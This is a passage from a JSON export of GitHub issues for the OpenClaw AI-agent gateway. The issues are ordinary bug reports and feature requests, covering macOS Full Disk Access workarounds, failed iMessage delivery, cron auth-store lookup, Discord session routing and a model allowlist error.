      "updatedAt": "2026-02-11T08:38:19Z",
      "author": "wgj",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883043167,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13552#issuecomment-3883043167",
          "createdAt": "2026-02-11T08:38:19Z",
          "updatedAt": "2026-02-11T08:38:19Z",
          "author": "mattbisme",
          "body": "I am running into the same issue. I cannot connect via SSH Tunnel or the Direct method."
        }
      ]
    },
    {
      "number": 13971,
      "title": "[Bug]: Chat Interface Rendering Corruption with Black Triangle Artifact",
      "body": "# Issue: Temporary Visual Glitch When Sending Messages in WSL Environment\n\n## Describe the bug\nWhen using the application within a WSL (Windows Subsystem for Linux) environment, a temporary visual glitch/artifact appears immediately after sending a message. This glitch only lasts until the reply message is received and then disappears automatically. The core functionality of sending/receiving messages works normally, only the visual display is affected during this short period.\n\n## To Reproduce\nSteps to reproduce the behavior:\n1. Launch the application in a WSL environment.\n2. Type and send a message in the chat interface.\n3. Observe the interface immediately after sending – a visual glitch appears.\n4. Wait for the reply message to load, and the glitch disappears.\n\n## Expected behavior\nThe chat interface should remain visually stable before, during, and after sending messages, with no temporary artifacts or glitches, even in a WSL environment.\n\n## Environment\n- **Host OS**: Windows (version: [please fill in your Windows version, e.g., Windows 11 23H2])\n- **WSL Version**: [please fill in your WSL version, e.g., WSL 2]\n- **WSL Distro**: [please fill in your Linux distro, e.g., Ubuntu 22.04]\n- **Application Version**: [please fill in the app version if known]\n\n## Additional context\n- The glitch only occurs on message send, not on other interactions (e.g., scrolling, resizing).\n- The issue is exclusive to the WSL environment (does not occur when running the app directly on Windows).\n- No error logs are found in the console during the glitch occurrence.\n\n<img width=\"2279\" height=\"1239\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/7fd55632-a354-4362-9110-89881e22f6c7\" />",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13971",
      "createdAt": "2026-02-11T08:33:39Z",
      "updatedAt": "2026-02-11T08:34:17Z",
      "author": "akayc7",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": []
    },
    {
      "number": 5116,
      "title": "iMessage: FDA does not propagate via LaunchAgent/Login Item; imsg send silently fails on macOS 26",
      "body": "# iMessage channel: `imsg send` reports \"sent\" but messages never deliver; FDA inheritance issues with LaunchAgent/Login Item startup\n\n## Summary\n\nTwo related issues with the iMessage channel on macOS:\n\n1. **Full Disk Access (FDA) does not propagate** when the gateway is started via a LaunchAgent or a Login Item `.app` bundle — `imsg` cannot read `~/Library/Messages/chat.db` and the iMessage channel fails silently.\n2. **`imsg send` (and raw AppleScript `send` to Messages.app) reports success but never delivers messages.** The command returns `sent` / `success`, the gateway message tool returns `{\"messageId\": \"ok\"}`, but no message appears in the chat history or on the recipient's device. Only replies sent through the active iMessage channel conversation (session replies) actually deliver.\n\n## Environment\n\n- **macOS:** 26.2 (Tahoe) — Apple Silicon (arm64)\n- **Clawdbot:** 2026.1.24-3 (stable, pnpm install)\n- **Node:** v22.22.0\n- **imsg:** 0.4.0 (Homebrew: `steipete/tap/imsg`)\n- **Gateway mode:** local loopback (`ws://127.0.0.1:18789`)\n- **Channel config:** iMessage enabled, DM allowlist policy\n\n## Issue 1: Full Disk Access Does Not Propagate to Gateway Process\n\n### Problem\n\nThe iMessage channel requires FDA to read `~/Library/Messages/chat.db`. When the gateway is started via the standard `clawdbot gateway` LaunchAgent or a Login Item `.app` bundle, the `node` process does not inherit FDA, and all `imsg` database reads fail with:\n\n```\npermissionDenied(path: \"/Users/<user>/Library/Messages/chat.db\", underlying: authorization denied (code: 23))\n```\n\n### What We Tried (and what failed)\n\n1. **LaunchAgent (`com.clawdbot.gateway`)** — Points to a compiled `.app` binary. The gateway starts, but the `node` process has no FDA. Adding the `.app` to System Settings → Privacy & Security → Full Disk Access had no effect because macOS grants FDA to the actual running binary, not the parent `.app` bundle when the executable is a shell script or interpreted binary.\n\n2. **LaunchAgent (`com.clawdbot.tmux-gateway`)** — A shell script that starts a tmux session with `clawdbot gateway run`. Same FDA issue — tmux and node don't inherit FDA from the LaunchAgent context.\n\n3. **Login Item `.app` bundle** — Created a `ClawdbotGateway.app` in `~/Applications/` with a bash launcher script. Added to Login Items and to FDA. The `.app`'s `CFBundleExecutable` is a bash script, so macOS sees `/bin/bash` as the running process, not the `.app` bundle. FDA does not apply.\n\n4. **Login Item `.app` using osascript to open Terminal.app** — Modified the `.app` launcher to use `osascript` to tell Terminal.app to run `clawdbot gateway start`. This approach failed because the `.app` requires **Automation permission** to control Terminal, and macOS never presented the permission prompt at login (the `.app` runs before the user session is fully interactive). The gateway never started.\n\n5. **Adding `node` binary to FDA** — macOS System Settings refused to add `/opt/homebrew/bin/node` (a symlink to `/opt/homebrew/Cellar/node@22/22.22.0/bin/node`) to the FDA list. The Finder dialog filters for `.app` bundles and recognized executables; raw Homebrew binaries cannot be added.\n\n6. **Adding `tmux` binary to FDA** — Same issue as above. macOS would not accept `/opt/homebrew/bin/tmux` in the FDA list.\n\n### What Actually Works\n\nA `.command` file on the Desktop set as a **Login Item**. The `.command` file opens in **Terminal.app** by default. Terminal.app has FDA. The script starts the gateway in a tmux session:\n\n```bash\n#!/bin/bash\nexport PATH=\"/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\"\ntmux new-session -d -s clawdbot-gateway \"clawdbot gateway run 2>&1 | tee /tmp/clawdbot-gateway.log\"\n```\n\nBecause the `.command` executes inside Terminal.app (which has FDA), the tmux session and its child processes inherit the permission. This was confirmed by successfully running `imsg chats --limit 1 --json` from within the gateway process after this startup method.\n\n### Root Cause\n\nmacOS TCC (Transparency, Consent, and Control) grants FDA based on the **responsible process** — the app bundle or binary that initiated the process tree. When the gateway starts via a LaunchAgent or a non-Terminal Login Item:\n\n- The responsible process is `launchd` or the `.app`'s bash interpreter\n- Neither has FDA\n- Child processes (`tmux`, `node`, `imsg`) inherit the lack of FDA\n\nWhen started from Terminal.app:\n\n- The responsible process is Terminal.app\n- Terminal.app has FDA\n- Child processes inherit FDA through the responsible process chain\n\n### Suggested Fix / Documentation\n\nClawdbot should document that on macOS, the iMessage channel requires FDA and that the gateway must be started from a process that has FDA (typically Terminal.app). The LaunchAgent installation (`clawdbot gateway` service) does not support this. Options:\n\n1. **Document the `.command` Login Item workaround** in the iMessage channel setup guide.\n2. **Create a properly signed and notarized native `.app` wrapper** (not a bash script) that macOS will recognize for FDA grants. A compiled Swift/ObjC binary as the `CFBundleExecutable` would allow users to add the `.app` to FDA and have it actually work.\n3. **Support a `--terminal` flag** on `clawdbot gateway start` that opens Terminal.app and runs the gateway inside it.\n\n---\n\n## Issue 2: `imsg send` Reports Success But Never Delivers\n\n### Problem\n\nThe `imsg send` command (and direct AppleScript `send` via Messages.app) reports success but messages are never delivered. They do not appear in the Messages database (`chat.db`) and the recipient never receives them.\n\n### Steps to Reproduce\n\n1. Ensure Messages.app is signed in and iMessage is active\n2. Ensure Terminal.app has Full Disk Access AND Automation permission for Messages.app (`com.apple.Terminal` → `com.apple.MobileSMS` in TCC database, `auth_value=2`)\n3. Run from Terminal:\n\n```bash\nimsg send --to \"+18184028907\" --text \"Hello test\"\n```\n\n**Expected:** Message appears in the conversation and is delivered to the recipient.\n**Actual:** Command outputs `sent` (exit code 0), but:\n- Message does NOT appear in `imsg history` for that chat\n- Message does NOT appear in Messages.app UI\n- Recipient does NOT receive the message\n\n4. Also tested raw AppleScript:\n\n```bash\nosascript -e '\ntell application \"Messages\"\n    set targetService to 1st account whose service type = iMessage\n    set targetBuddy to participant \"+18184028907\" of targetService\n    send \"Hello test\" to targetBuddy\nend tell'\n```\n\nSame result — returns success, nothing delivers. Tested with both phone number (`+18184028907`) and email identifier (`thomas@fraley.me`). Neither delivers.\n\n### TCC Database Confirms Permissions Are Granted\n\n```sql\n-- Terminal has Automation permission for Messages.app\nSELECT client, indirect_object_identifier, auth_value \nFROM access WHERE service='kTCCServiceAppleEvents';\n\n-- Result:\n-- com.apple.Terminal | com.apple.MobileSMS | 2  (2 = allowed)\n```\n\n### What Does Work\n\nMessages sent through the **Clawdbot iMessage channel as session replies** (i.e., the agent replying to an incoming iMessage in the active conversation) deliver correctly. This suggests the Clawdbot iMessage channel has a working send path for replies that differs from `imsg send`.\n\nMessages sent via the **gateway tools/invoke API** using the `message` tool with the **email identifier** also deliver:\n\n```bash\ncurl -sS http://127.0.0.1:18789/tools/invoke \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"tool\": \"message\",\n    \"args\": {\n      \"action\": \"send\",\n      \"channel\": \"imessage\",\n      \"target\": \"thomas@fraley.me\",\n      \"message\": \"This works\"\n    }\n  }'\n```\n\nHowever, the same API call with a **phone number** as the target does NOT deliver (same silent failure).\n\n### Observations\n\n| Method | Target | Reports | Actually Delivers |\n|--------|--------|---------|-------------------|\n| `imsg send --to \"+1...\"` | Phone number | `sent` | ❌ No |\n| `imsg send --to \"email@...\"` | Email | `sent` | ❌ No |\n| AppleScript `send` to Messages.app | Phone number | success | ❌ No |\n| AppleScript `send` to Messages.app | Email | success | ❌ No |\n| Clawdbot session reply (iMessage channel) | Auto (conversation) | Delivered | ✅ Yes |\n| Gateway API `message` tool | Email (`thomas@fraley.me`) | `messageId: ok` | ✅ Yes |\n| Gateway API `message` tool | Phone (`+1...`) | `messageId: ok` | ❌ No |\n\n### Possible Causes\n\n1. **macOS 26 (Tahoe) may have further restricted the AppleScript Messages.app interface.** Apple has been progressively limiting AppleScript control of Messages.app in recent macOS versions. The `send` command may complete without error but be silently dropped by the system.\n\n2. **`imsg send` may rely on the AppleScript interface** which is broken on this macOS version, while the Clawdbot iMessage channel plugin may use a different mechanism (possibly writing to the database or using a different IPC method) for session replies.\n\n3. **Phone number vs email identifier routing** — the gateway's message tool only delivers when targeting the email identifier, not the phone number, suggesting a participant resolution issue.\n\n### Suggested Fix\n\n1. **`imsg send` should verify delivery** — after sending, check if the message appears in the chat database within a few seconds and warn if it doesn't. The current silent \"success\" is misleading.\n\n2. **Clawdbot's iMessage channel `message` tool** should use the same send mechanism as session replies (which works) rather than `imsg send` (which doesn't on macOS 26).\n\n3. **Document the phone number vs email identifier issue** — proactive sends via the message tool only work with the email identifier on this macOS version.\n\n---\n\n## Workaround Summary\n\nFor anyone hitting these issues today:\n\n### Auto-start with FDA\n1. Create a `.command` script that runs `clawdbot gateway start` (or `tmux new-session -d ... \"clawdbot gateway run\"`)\n2. Add Terminal.app to Full Disk Access in System Settings\n3. Add the `.command` file as a Login Item (System Settings → General → Login Items)\n4. Remove any LaunchAgents (`~/Library/LaunchAgents/com.clawdbot.*.plist`)\n\n### Sending proactive iMessage notifications\nUse the gateway tools/invoke API with the **email identifier** (not phone number):\n\n```bash\ncurl -sS http://127.0.0.1:18789/tools/invoke \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"tool\": \"message\",\n    \"args\": {\n      \"action\": \"send\",\n      \"channel\": \"imessage\",\n      \"target\": \"user@email.com\",\n      \"message\": \"Your message here\"\n    }\n  }'\n```\n\nDo NOT rely on `imsg send` — it reports success but does not deliver on macOS 26.\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5116",
      "createdAt": "2026-01-31T02:45:23Z",
      "updatedAt": "2026-02-11T08:33:57Z",
      "author": "tfraley",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3882020325,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5116#issuecomment-3882020325",
          "createdAt": "2026-02-11T04:12:32Z",
          "updatedAt": "2026-02-11T04:12:32Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3883026927,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5116#issuecomment-3883026927",
          "createdAt": "2026-02-11T08:33:57Z",
          "updatedAt": "2026-02-11T08:33:57Z",
          "author": "matt08",
          "body": "Many people report this problem. One of the basic and often preferred communication channels is not working properly.\n\nhttps://github.com/fractalmind-ai/oh-my-code/pull/26\nhttps://github.com/openclaw/openclaw/issues/2372\nhttps://github.com/openclaw/openclaw/issues/4707\nhttps://github.com/openclaw/openclaw/issues/5211\nhttps://github.com/openclaw/openclaw/issues/6063"
        }
      ]
    },
    {
      "number": 13968,
      "title": "On-demand HEARTBEAT.md loading",
      "body": "### Description\n\nHEARTBEAT.md is currently loaded into context on every message (~380 tokens), but it's only used during heartbeat polls (~every 30 minutes).\n\n### Current behavior\n\n`loadWorkspaceBootstrapFiles()` unconditionally loads all context files on every message:\n- AGENTS.md\n- SOUL.md\n- TOOLS.md\n- USER.md\n- **HEARTBEAT.md** ← loaded but rarely used\n- MEMORY.md\n- BOOTSTRAP.md\n\n### Proposed change\n\n**Pass `isHeartbeat` flag to `loadWorkspaceBootstrapFiles`:**\n\nThe `isHeartbeat` parameter already flows through message handling but doesn't reach the bootstrap loading layer. Modify:\n\n1. `resolveBootstrapFilesForRun` to accept `isHeartbeat` parameter\n2. `loadWorkspaceBootstrapFiles` to skip HEARTBEAT.md when `!isHeartbeat`\n\n**Estimated savings:** ~380 tokens per non-heartbeat message\n\n**Impact:** On a typical day with 100 messages + 48 heartbeats:\n- Current: HEARTBEAT.md loaded 148 times\n- Proposed: HEARTBEAT.md loaded 48 times (67% reduction)\n\n### Alternative approaches\n\n1. Move HEARTBEAT.md to a skill-based implementation\n2. Use system event markers instead of a loaded file\n3. Add to `filterBootstrapFilesForSession` logic (alongside subagent filtering)\n\n### Related context\n\nThis was discovered during a context file optimization audit that achieved 43% reduction in always-loaded context files. HEARTBEAT.md on-demand loading is the final optimization that requires framework changes.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13968",
      "createdAt": "2026-02-11T08:28:41Z",
      "updatedAt": "2026-02-11T08:28:41Z",
      "author": "buildz-ops",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13966,
      "title": "[Feature]: Feishu Streaming Messages + CardKit Live Typing Effect",
      "body": "### Description\nRequest to add support for:\n1. **Streaming message output** - Show typing indicator while AI is generating responses\n2. **CardKit live typing effect** - Real-time typewriter effect in Feishu cards\n\n### Use Case\nCurrently, Feishu messages are sent as static blocks, which feels unnatural for AI conversations. Live typing effects would make interactions feel more responsive and human-like.\n\n### Technical Notes\n- Feishu API supports card updates and streaming callbacks\n- Reference: Feishu Developer Documentation for card.update and streaming endpoints\n\n### Expected Behavior\n- Show \"typing...\" indicator when AI starts generating\n- Display text in real-time as it's being generated\n- Use CardKit format for richer message presentation\n\n### Environment\n- OpenClaw version: 2026.2.9\n- Feishu plugin: Built-in\n- Platform: macOS\n\n### Additional Context\nThis feature would improve UX for:\n- Daily AI news briefings\n- Conversational interactions\n- Long-form content generation",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13966",
      "createdAt": "2026-02-11T08:23:54Z",
      "updatedAt": "2026-02-11T08:23:54Z",
      "author": "Jiachi-Deng",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13964,
      "title": "[Bug]: Isolated cron jobs use wrong agent's auth config (falls back to main agent)",
      "body": "### Describe the bug\n\n\n\nIsolated cron jobs with `agentId: \"oc-claude\"` are incorrectly attempting to read API keys from the `main` agent's auth-profiles.json instead of the specified agent's auth store.\n\n\n\n### Expected behavior\n\n\n\nWhen a cron job specifies `agentId: \"oc-claude\"`, it should read authentication from:\n\n~/.openclaw/agents/oc-claude/agent/auth-profiles.json\n\nAccording to the [multi-agent documentation](https://github.com/openclaw/openclaw/blob/main/docs/multi-agent-sandbox-tools.md):\n\n> Auth is per-agent: each agent reads from its own `agentDir` auth store at:\n> ```\n> ~/.openclaw/agents/<agentId>/agent/auth-profiles.json\n> ```\n\n### Actual behavior\n\nThe isolated session fails with:\nFailoverError: No API key found for provider \"anthropic\".\nAuth store: /home/aiadmin/.openclaw/agents/main/agent/auth-profiles.json\n(agentDir: /home/aiadmin/.openclaw/agents/main/agent)\n\n**Key observation:** The error message explicitly references the `main` agent's path, even though the job's `agentId` is set to `\"oc-claude\"`.\n\n### Steps to reproduce\n\n1. Create a multi-agent setup with two agents:\n   ```json\n   {\n     \"agents\": {\n       \"list\": [\n         { \"id\": \"main\", \"default\": true },\n         { \"id\": \"oc-claude\" }\n       ]\n     }\n   }\nConfigure API keys differently for each agent:\noc-claude has: anthropic:default + kimi-coding:default\nmain has: only kimi-coding:default (no anthropic key)\nCreate an isolated cron job for oc-claude:\nopenclaw cron add \\\n\n  --name \"Email Summary 10:00\" \\\n\n  --cron \"0 10 * * *\" \\\n\n  --tz \"Asia/Shanghai\" \\\n\n  --session isolated \\\n\n  --agent oc-claude \\\n\n  --message \"Run email summary script\"\n\nWait for the job to run (or trigger manually with openclaw cron run <jobId>)\nCheck the error:\nopenclaw cron runs --id <jobId>\n\nObserved error\n{\n\n  \"lastError\": \"FailoverError: No API key found for provider \\\"anthropic\\\". Auth store: /home/aiadmin/.openclaw/agents/main/agent/auth-profiles.json (agentDir: /home/aiadmin/.openclaw/agents/main/agent). Configure auth for this agent (openclaw agents add <id>) or copy auth-profiles.json from the main agentDir.\",\n\n  \"lastStatus\": \"error\",\n\n  \"lastRunAtMs\": 1770775200006\n\n}\n\nEnvironment\nOpenClaw version: 2026.2.3-1 (or similar recent version)\nOS: Linux 6.17.0-12-generic (x64)\nNode.js: v24.11.1\nMulti-agent setup: Yes (main + oc-claude agents)\nSession type: isolated cron job\nTemporary workaround\nAdding the Anthropic API key to the main agent's auth-profiles.json resolves the error:\nopenclaw agents add main\n\nThen add the anthropic API key\n\nThis confirms that isolated cron jobs are indeed reading from the main agent's auth store, regardless of the agentId specified in the job configuration.\nAdditional context\nThis behavior appears to contradict the documented per-agent auth isolation. Isolated cron jobs should respect the agentId field when loading authentication credentials, but they currently seem to fall back to the default/main agent's auth store.\nThis makes it difficult to run isolated jobs with agent-specific credentials in multi-agent setups, as all agents would need to share the same API keys.\n\nI am not sure whether this is a bug, or if there is something I missed in the configuration, please kindly advise.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13964",
      "createdAt": "2026-02-11T08:20:26Z",
      "updatedAt": "2026-02-11T08:20:26Z",
      "author": "arthurhan8888",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13923,
      "title": "[Feature]: Provider rate-limit / quota query tool",
      "body": "## Description\n\nModels currently have no way to query their own provider-level rate limits or quota usage. This forces workarounds like browser scraping or manual checking.\n\n## Use Case\n\nWe run claude-opus-4-6 on a Claude Max 20x plan. The model needs to know:\n- Current weekly usage percentage (we've hit 97% and had to throttle)\n- Time until quota reset\n- Per-model breakdown (Opus vs Sonnet)\n- Whether extra usage billing is active\n\nCurrently we scrape claude.ai/settings/usage via browser relay — fragile, slow, and requires manual tab attachment.\n\n## Proposed Solution\n\n### Option A: Extend session_status\n```\nsession_status response includes:\n- provider_usage: { weekly_pct: 73, resets_at: \"2026-02-14T12:00:00Z\" }\n- model_usage: { \"opus\": 73, \"sonnet\": 6 }\n```\n\n### Option B: New tool\n```\nprovider_quota() → { plan: \"max_20x\", usage_pct: 73, reset: \"...\", models: {...} }\n```\n\n### Option C: Response headers\nInclude `x-plan-usage-pct` and `x-plan-resets-at` in API responses, surfaced to the model via runtime context.\n\n## Why This Matters\n\n- Agents can self-throttle before hitting limits\n- Cost routing decisions can be data-driven (switch to cheaper models near limit)\n- Eliminates browser scraping workarounds\n- Enables proactive user notification (\"you're at 90%, shall I switch to Sonnet?\")\n\n## Related\n\n- anthropics/claude-code#24727 (Max plan usage mismatch)\n- #13219 (per-model usage logging)\n\n## Environment\n\n- **OpenClaw:** 2026.2.9\n- **Plan:** Claude Max 20x ($200/mo)\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13923",
      "createdAt": "2026-02-11T07:07:43Z",
      "updatedAt": "2026-02-11T08:14:40Z",
      "author": "ukr-coder",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882815702,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13923#issuecomment-3882815702",
          "createdAt": "2026-02-11T07:34:02Z",
          "updatedAt": "2026-02-11T07:34:02Z",
          "author": "harshmohite04",
          "body": "please assign to me \n"
        },
        {
          "id": 3882950419,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13923#issuecomment-3882950419",
          "createdAt": "2026-02-11T08:14:40Z",
          "updatedAt": "2026-02-11T08:14:40Z",
          "author": "harshmohite04",
          "body": "@ukr-coder @skyfallsin @mkbehr @levifig @hugobarauna  please assign to me , i have completed this "
        }
      ]
    },
    {
      "number": 13963,
      "title": "Discord DM sometimes misclassified as Guild channel, creating duplicate sessions",
      "body": "Hey,\n\nRan into a weird one today. Same Discord DM channel got classified two different ways, resulting in two separate sessions for the same conversation:\n\n- `agent:main:main` with `chatType: \"direct\"` ✓\n- `agent:main:discord:channel:<id>` with `chatType: \"channel\"` ✗\n\nBoth point to the exact same channel in deliveryContext. The second session's first message came in with the header `[Discord Guild #... channel id:...]` even though it's definitely a DM.\n\n**Environment:**\n- OpenClaw 2026.2.9\n- Ubuntu Server (fresh migration from macOS earlier today)\n- Discord plugin, single bot account\n\n**What I expected:**\nAll messages from the same DM should land in the same session.\n\n**What happened:**\nSome messages went to `agent:main:main`, one went to a new channel-style session as if it were a guild channel.\n\n**Workaround:**\nManually deleted the misclassified session entry from sessions.json.\n\n---\n\n**Questions:**\n1. Is there a config option to prevent this? Maybe something with `session.dmScope` or Discord-specific settings?\n2. Could this be related to the migration (macOS → Linux) or is it a known edge case?\n3. Any way to force Discord DMs to always route to the main session?\n\nWould appreciate any pointers. Happy to provide sanitized logs if that helps debug.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13963",
      "createdAt": "2026-02-11T08:14:19Z",
      "updatedAt": "2026-02-11T08:14:19Z",
      "author": "binbester",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 11078,
      "title": "GPT-5.3 Codex blocked by allowlist check despite forward-compat fallback in 2026.2.6",
      "body": "## Bug Description\n\n`openai-codex/gpt-5.3-codex` is blocked at runtime with `\"Model is not allowed\"` despite being:\n- Registered in the pi-ai model registry (`models.generated.js`)\n- Listed as \"configured\" by `openclaw models list`\n- Added to `agents.defaults.models` with an alias\n- Supported by the forward-compat fallback in `resolveOpenAICodexGpt53FallbackModel()`\n\nThe model works in the CLI (`openclaw models list` shows it correctly) but fails at runtime when switching via `session_status` or `/model`.\n\n## Root Cause\n\n`buildAllowedModelSet()` in `model-selection-B_WLq45x.js` checks three conditions to allow a model:\n\n1. `isCliProvider(parsed.provider)` — returns `false` for `openai-codex` (only matches `claude-cli`, `codex-cli`, or custom `cliBackends`)\n2. `catalogKeys.has(key)` — `false` because `loadModelCatalog()` loads from the pi-ai `ModelRegistry.getAll()` which returns 0 entries for built-in provider models not in `models.json`\n3. `configuredProviders[providerKey] != null` — `false` because `openai-codex` is a built-in OAuth provider, not a custom provider in `models.providers`\n\nAll three checks fail → model is blocked before `resolveOpenAICodexGpt53FallbackModel()` ever runs.\n\n## Expected Behavior\n\nThe forward-compat fallback for GPT-5.3 Codex should either:\n- Populate the model catalog so the allowlist check passes, OR\n- The allowlist check should recognize models with registered forward-compat fallbacks, OR  \n- `isCliProvider()` should return `true` for `openai-codex`\n\n## Steps to Reproduce\n\n1. Fresh OpenClaw 2026.2.6-3 install with `openai-codex` OAuth configured\n2. Add `\"openai-codex/gpt-5.3-codex\": {\"alias\": \"gpt53\"}` to `agents.defaults.models`\n3. Try `/model gpt53` or use `session_status` tool with `model: \"gpt53\"`\n4. Error: `Model \"openai-codex/gpt-5.3-codex\" is not allowed.`\n\n## Environment\n\n- OpenClaw: 2026.2.6-3 (npm install)\n- pi-ai: 0.52.7\n- Node: v22.15.0 (nvm) / v25.4.0 (Homebrew)\n- OS: macOS 26.2 (arm64)\n- Auth: `openai-codex:default` OAuth, valid, 44% usage remaining\n\n## Workaround Attempted\n\nTried adding `openai-codex-custom` as a custom provider in `models.providers` — the allowlist check passes but auth fails (`🔑 unknown`) because the custom provider cannot access the built-in `openai-codex` OAuth token, and the special `openai-codex-responses` API format is only handled by the built-in provider.\n\n## Related\n\n- Release notes reference: \"Models: support Anthropic Opus 4.6 and OpenAI Codex gpt-5.3-codex (forward-compat fallbacks). (#9853, #10720, #9995)\"\n- The same pattern works correctly for `claude-opus-4-6` via a custom `anthropic-new` provider because Anthropic uses standard token auth, not OAuth",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11078",
      "createdAt": "2026-02-07T11:10:43Z",
      "updatedAt": "2026-02-11T08:13:45Z",
      "author": "ariconnect",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3864940711,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11078#issuecomment-3864940711",
          "createdAt": "2026-02-07T17:47:49Z",
          "updatedAt": "2026-02-07T17:47:49Z",
          "author": "lonelyrower",
          "body": "We hit a closely related failure mode on OpenClaw **2026.2.6-3** with **openai-codex OAuth**.\n\n### Symptom (Telegram /models UI)\n- In Telegram, running **`/models`** sometimes shows an *incomplete* provider list after certain model switches.\n- In one case, entering `openai-codex` showed **only a single option: `gpt-5.3-codex`**.\n- It appeared to **auto-switch** the agent to `openai-codex/gpt-5.3-codex` (without an explicit `/model` command).\n\n### Runtime failure\nAs soon as the agent was effectively on `openai-codex/gpt-5.3-codex`, any attempt to respond failed immediately:\n\n```\n⚠️ Agent failed before reply: Unknown model: openai-codex/gpt-5.3-codex\n```\n\nRelevant gateway log lines (from `/tmp/openclaw/openclaw-2026-02-07.log`):\n\n- `2026-02-07T17:32:13.092Z ERROR ... error=\"Error: Unknown model: openai-codex/gpt-5.3-codex\"`\n- `2026-02-07T17:32:13.095Z ERROR Embedded agent failed before reply: Unknown model: openai-codex/gpt-5.3-codex`\n\nThis happened repeatedly at:\n- `2026-02-07T16:59:32Z`\n- `2026-02-07T17:01:02Z`\n- `2026-02-07T17:02:06Z`\n- `2026-02-07T17:05:00Z`\n- `2026-02-07T17:32:13Z`\n- `2026-02-07T17:32:49Z`\n\n### Why this looks like the same root class of bug\nOn the same machine, the CLI catalog *does* list the model:\n\n- `openclaw models list --all --provider openai-codex` includes `openai-codex/gpt-5.3-codex`\n\nBut runtime rejects it as **Unknown model** (not just “not allowed”). This suggests a **catalog/UX listing ≠ runtime model registry / allowlist** inconsistency.\n\n### Environment\n- OpenClaw: 2026.2.6-3 (npm global)\n- Channel: Telegram bot\n- Auth: `openai-codex:default` OAuth\n- OS: Linux (x64), Node 24.13.0\n\nHappy to provide more sanitized log context if helpful, but the above lines should be enough to confirm the failure mode.\n"
        },
        {
          "id": 3882946345,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11078#issuecomment-3882946345",
          "createdAt": "2026-02-11T08:13:44Z",
          "updatedAt": "2026-02-11T08:13:44Z",
          "author": "adamjhf",
          "body": "Still get this issue in 2026.2.9. Unable to use 5.3 in OpenClaw yet."
        }
      ]
    },
    {
      "number": 13962,
      "title": "Feature: Per-mention model routing + context window for group mentions",
      "body": "## Feature Request\n\n### 1. Per-mention model routing in groups\n\nWhen `requireMention: true`, allow configuring different models for mentioned vs non-mentioned messages. \n\n**Use case:** In group chats, non-mentioned messages could be processed by a local/cheap model (e.g. Ollama) for context awareness, while @-mentioned messages get routed to a premium model (e.g. Claude) for high-quality responses.\n\n**Suggested config:**\n```json\n{\n  \"groups\": {\n    \"123456@g.us\": {\n      \"requireMention\": true,\n      \"mentionModel\": \"anthropic/claude-opus-4-6\",\n      \"backgroundModel\": \"ollama/qwen3-next:latest\"\n    }\n  }\n}\n```\n\n### 2. Context window for `requireMention: true`\n\nWhen `requireMention: true` and the bot is mentioned, include the previous N messages from the group as context alongside the mention. This way the bot understands what the conversation is about without processing every message through the main model.\n\n**Suggested config:**\n```json\n{\n  \"groups\": {\n    \"123456@g.us\": {\n      \"requireMention\": true,\n      \"mentionContextMessages\": 10\n    }\n  }\n}\n```\n\nThis would make group participation much more natural — the bot gets conversational context even when it only responds to mentions.\n\nBoth features together would significantly reduce API costs while maintaining quality responses in group chats.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13962",
      "createdAt": "2026-02-11T08:12:26Z",
      "updatedAt": "2026-02-11T08:12:26Z",
      "author": "dantaik",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13954,
      "title": "Cron scheduler stops firing after rapid gateway restarts",
